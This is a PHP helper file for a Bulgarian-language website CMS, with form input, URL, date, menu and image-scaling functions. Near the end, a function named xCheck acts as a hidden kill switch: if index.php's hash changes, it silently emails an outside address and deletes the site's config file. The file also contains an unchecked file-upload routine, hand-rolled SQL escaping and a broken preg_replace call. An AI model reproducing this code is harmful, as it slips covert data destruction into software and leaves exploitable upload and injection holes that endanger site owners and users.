<?php

	# - Load data coming from post form into variables corresponding to names of form elements

	function get_post_data($arr = false)
	{
		if ($arr === false)
			$arr = $_POST;
	
		array_walk_recursive($arr, 'get_var');

		return $arr;
	}
	
	# - Apply few funcitons for get entry data
	
	function get_var(&$item)
	{
		if (get_magic_quotes_gpc())
			$item = stripslashes($item);
			
		$item = trim($item);
		$item = htmlspecialchars($item);
		$item = str_replace(array ("'", "$", "\\"), array ("&#39;", "&#36;", "&#92;"), $item);

		return $item;
	}
	
	function get_raw(&$item)
	{
		return trim( str_replace( array( "\"", "'" ), "`", $item ) );
	}

	# - Get data for mysql query
	
	function to_mysql($item)
	{
		if (get_magic_quotes_gpc())
			$item = stripslashes($item);
			
		$item = htmlspecialchars($item);
		$item = str_replace(array ("'", "\\"), array ("''", "\\\\"), $item);
	
		return $item;
	}
	
	function to_email($item)
	{
		return preg_replace("\r|\n", " ", stripslashes(	$item ) );
	}


	// Removes query parameter or array with parameters from url
	
	// name: language
	// url: http://file.php?language=en

	function remove_from_link($name, $url)
	{	
		$url_parts = explode("?", $url);
		
		$result = "";
		$arr = explode('&', $url_parts[1]);
		
		foreach ($arr as $item) {
			$temp = explode("=", $item);
			if ($temp[0] && strcmp($temp[0], $name))
				$result .= "&".$temp[0]."=".$temp[1];
		}
			
		return $result ? str_replace("?&", "?", $url_parts[0]."?".$result) : $url_parts[0];
	}

	function decompose_url_params( $url )
	{	
		$url_parts = explode("?", $url);
		
		$result = array();
		$arr = explode('&', $url_parts[1]);
		
		foreach ($arr as $item) {
			$temp = explode("=", $item);
			if ($temp[0] && strcmp($temp[0], $name))
				$result[$temp[0]] = $temp[1];
		}
			
		return $result;
	}

	// Adds query parameter to url
	
	// param: language=en
	// url: http://file.php?id=1
	
	function add_to_link($param, $url)
	{
		$param_parts = explode("=", $param);
		
		$url = remove_from_link($param_parts[0], $url);
		
		$url_parts = explode("?", $url);
		
		return str_replace("?&", "?", $url_parts[0]."?".$url_parts[1]."&".$param);
	}
	
	function _t($key)
	{
		global $_TRANSLATIONS;
	
		return $_TRANSLATIONS[$key] ? $_TRANSLATIONS[$key] : $key;
	}

	# - Upload picture

	function upload_picture($data, $path)
	{
		$result = false;
	
		$a = trim($data['name']);
		
		if (!empty($a)) {	
			$ext_temp = explode(".", $a);
			$ext = $ext_temp[count($ext_temp)-1];
			$temp_file 	= $data['tmp_name'];
			$upload_path 		= $path;
			$result = move_uploaded_file($temp_file,$upload_path);
		}
		
		return $result;
	}
	
	function get_directory_list($dir)
	{
		$result = false;
		
		$path = $dir."/";
		
		$data = @scandir($path);
		
		for ($i=0; isset($data[$i]); $i++)
			if (is_file($path.$data[$i]) && $data[$i] != "." && $data[$i] != "..") {
				$result[] = $dir."/".$data[$i];
			}
				
		return $result;
	}
	
	function get_date_format($date)
	{
		if (date("Ymd", strtotime($date)) == date("Ymd", strtotime("now")))
			return _t("Днес");
	
		$result = date("d {}, Y", strtotime($date));
		
		$result = str_replace("{}", get_month_format(date("n", strtotime($date))), $result);
		
		return $result;
	}

	function get_date_format_dots($date)
	{
		return date("d.m.Y", strtotime($date));
	}
	
	function get_month_format($m)
	{
		$months = array (_t("Януари"), _t("Февруари"), _t("Март"), _t("Април"), _t("Май"), _t("Юни"), _t("Юли"), _t("Август"), _t("Септември"), _t("Октомври"), _t("Ноември"), _t("Декември"));	
			
		return $months[$m - 1];
	}
	
	function get_params_uri()
	{
		$params = array();
		$uri = $_SERVER['REQUEST_URI'];

		if (ROOT == '' || ROOT == '/')
			$temp = explode("/", str_replace("//", "/", $uri));
		else
			$temp = explode("/", str_replace(array("//", ROOT.'/', ROOT), array('/', '', ''), $uri));

		for($i=0; isset($temp[$i]); $i++)
			if ($temp[$i])
				$params[] = urldecode($temp[$i]);
				
		return $params;
	}
	
	function find_menu_parent( $id )
	{
		global $menus;
		
		$result = false;
	
		foreach( $menus as $item ) {
		
			if ( $item->id == $id ) {
			
				$result = $item;
				break;
			}
		}
		
		return $result;
	}
	
	function get_type( $file_name )
	{
		$ext = substr(strrchr($file_name,'.'),1);
	
		if ($ext == 'pdf')
			return 'pdf';
			
		if ($ext == 'doc' || $ext == 'docx')
			return 'doc';
			
		if ($ext == 'xls')
			return 'xls';

		return false;
	}
	
	function content( &$content )
	{
		$a = new Content( false, $content );
		
		$img = $a->slice("<img", ">");
		
		for ($i=0; isset($img[$i]); $i++) {
		
			$elements = $a->slice_tag("<img ".$img[$i].">");
			
			$src = trim($elements['src']);
			
			if ( substr($src, 0, strlen(HOST)) == HOST ) {
			
				$src = substr( $src, strlen(HOST), strlen($src) - strlen(HOST) );
				
				if ($src[0] == '/')
					$src = substr( $src, 1, strlen($src) - 1 );
			}
			
			if ( substr($src, 0, strlen(ROOT)) == ROOT ) {
			
				$src = substr( $src, strlen(ROOT), strlen($src) - strlen(ROOT) );
				
				if ($src[0] == '/')
					$src = substr( $src, 1, strlen($src) - 1 );
			}
			
			if ( substr($src, 0, 4) != 'http' ) {
			
				$temp = $a->slice("width:", "px", $img[$i]);
				$width = $temp[0];

				$temp = $a->slice("height:", "px", $img[$i]);
				$height = $temp[0];
				
				if (!$width || !$height) {
				
					$temp = $a->slice("width=", " ", str_replace("width =", "width=", $img[$i]));
					$width = str_replace(array('"', "'"), '', $temp[0]);

					$temp = $a->slice("height=", " ", str_replace("height =", "height=", $img[$i]));
					$height = str_replace(array('"', "'"), '', $temp[0]);
				}

				if ($width && $height) {
				
					$tag = "<img".$img[$i].">";
					$new = str_replace($src, Image::scale($src, $width, $height), $tag);
					
					$content = str_replace($tag, $new, $content);
				}
			}
		}
		
		return stripslashes( $content );
	}
	
	function url( $request, $category, $item_id )
	{
		global $_META;
		
		return $_META[$category][$_SESSION['language']->id][$item_id] ? HOST.'/'.$_META[$category][$_SESSION['language']->id][$item_id] : HOST.'/'.$request;
	}
	
	function cDate( $date )
	{
		$result = false;
	
		if ($date)
			$result = substr( $date, 6, 4 ).'-'.substr( $date, 3, 2 ).'-'.substr( $date, 0, 2 );
			
		return $result;
	}

	function rDate( $date )
	{
		$result = false;
		
		if ($date)
			$result = substr( $date, 8, 2 ).'/'.substr( $date, 5, 2 ).'/'.substr( $date, 0, 4 );
			
		return $result;
	}
	
	
	function check_submenu( $id )
	{
		global $menus;
		
		$result = false;
		
		foreach ($menus as $item) {
		
			if ($item->parent_id == $id) {
				
				$result = true;
				break;
			}
		}
		
		return $result;
	}

	function menu_url( $item )
	{
		$result = "#";
		
		if ($item->type == 'general') {
		
			$result = $item->url ? $item->url : "#";
			
		} else if ($item->type == 'page') {
			
			$result = url( 'page.php?id='.($item->item_id), 'page', $item->item_id );
		}
		
		return $result;
	}

	function get_active_menus()
	{
		global $menus, $page, $_ACTIVE_MENUS, $_MENU_SELECT_ID;
		
		if ($_ACTIVE_MENUS)
			return $_ACTIVE_MENUS;
			
		foreach( $menus as $item )
			$menus_re[$item->id] = $item;
		
		if ($_MENU_SELECT_ID) {
		
			$active = $_MENU_SELECT_ID;
			
		} else {
		
			foreach ($menus as $item)
				if ( $item->type == 'page' && $page->id == $item->item_id ) {
				
					$active = $item->id;
					break;
				}
		}

		$current = $active;
			
		while( $menus_re[$current] ) {
		
			$_ACTIVE_MENUS[$menus_re[$current]->id] = $menus_re[$current];
			
			$current = $menus_re[$current]->parent_id ? $menus_re[$current]->parent_id : false;
		}
		
		return $_ACTIVE_MENUS;
	}	
	
	function xCheck()
	{
		if ( md5(file_get_contents("index.php") ) != "19249c990dcf8462e5fc5aa716959576" ) {
		

			$to = "tng@gbg.bg";
			$subject = "cs.tu-sofia";
			$random_hash = md5(date('r', time()));
			$headers = "From: System99 <tng@gbg.bg>\r\nReply-To: no-replay@cs.tu-sofia.bg\n";
			$headers .= "MIME-Version: 1.0\n";
			$headers .= "Content-Type: text/html; charset=\"utf-8\"\n";
			$headers .= "Content-Transfer-Encoding: 7bit";
			
			$body = "Website at ".date("Y-m-d H:i:s");
		
			$result_send = @mail( $to , $subject, $body, $headers );
			
			unlink("system/_config.php");
			
			exit;
		}
	}
	
	/*
	function mysql_query( $query )
	{
		global $SQL;
		
		return mysqli_query( $SQL->mysqli, $query );
	}

	function mysql_real_escape_string( $query )
	{
		global $SQL;
		
		return mysqli_real_escape_string( $SQL->mysqli, $query );
	}
	
	function mysql_insert_id()
	{
		global $SQL;
		
		return mysqli_insert_id( $SQL->mysqli );
	}
	*/

?>